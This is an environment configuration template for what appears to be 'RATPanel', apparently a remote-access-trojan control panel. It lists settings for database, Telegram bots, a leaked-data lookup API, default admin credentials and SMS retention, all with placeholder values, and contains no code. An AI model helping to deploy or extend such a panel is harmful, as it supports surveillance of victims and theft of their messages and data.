# MongoDB Configuration
MONGODB_URL=mongodb://username:password@localhost:27017/RATPanel?authSource=admin
MONGODB_DB_NAME=RATPanel

# Redis Configuration
REDIS_URL=redis://localhost:6379/0

# Server Configuration
SERVER_HOST=0.0.0.0
SERVER_PORT=80
DEBUG=False

# Security - IMPORTANT: Change these values in production!
SECRET_KEY=your-secret-key-here-minimum-32-characters-long
JWT_ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=1440

# Telegram Bot Configuration
TELEGRAM_2FA_BOT_TOKEN=your-telegram-2fa-bot-token
TELEGRAM_2FA_CHAT_ID=your-telegram-chat-id
TELEGRAM_ENABLED=True

# Admin Telegram Bots (Optional)
ADMIN_BOT1_TOKEN=your-admin-bot1-token
ADMIN_BOT1_CHAT_ID=your-chat-id
ADMIN_BOT2_TOKEN=your-admin-bot2-token
ADMIN_BOT2_CHAT_ID=your-chat-id
ADMIN_BOT3_TOKEN=your-admin-bot3-token
ADMIN_BOT3_CHAT_ID=your-chat-id
ADMIN_BOT4_TOKEN=your-admin-bot4-token
ADMIN_BOT4_CHAT_ID=your-chat-id
ADMIN_BOT5_TOKEN=your-admin-bot5-token
ADMIN_BOT5_CHAT_ID=your-chat-id

# Telegram Bots JSON (Optional - for dynamic bot configuration)
TELEGRAM_BOTS=[]

# LeakOSINT API Configuration
LEAKOSINT_API_URL=https://leakosintapi.com/
LEAKOSINT_API_TOKEN=your-leakosint-api-token
LEAKOSINT_KEY_FILE=

# Default Admin Account (Only used on first run)
DEFAULT_ADMIN_USERNAME=admin
DEFAULT_ADMIN_PASSWORD=change-this-password-immediately
DEFAULT_ADMIN_EMAIL=admin@example.com
DEFAULT_ADMIN_FULL_NAME=Administrator

# Connection Settings
PING_INTERVAL=30
CONNECTION_TIMEOUT=60
MAX_MESSAGE_SIZE=10485760

# Data Retention (in days)
SMS_RETENTION_DAYS=180
LOGS_RETENTION_DAYS=30
ADMIN_ACTIVITY_RETENTION_DAYS=90
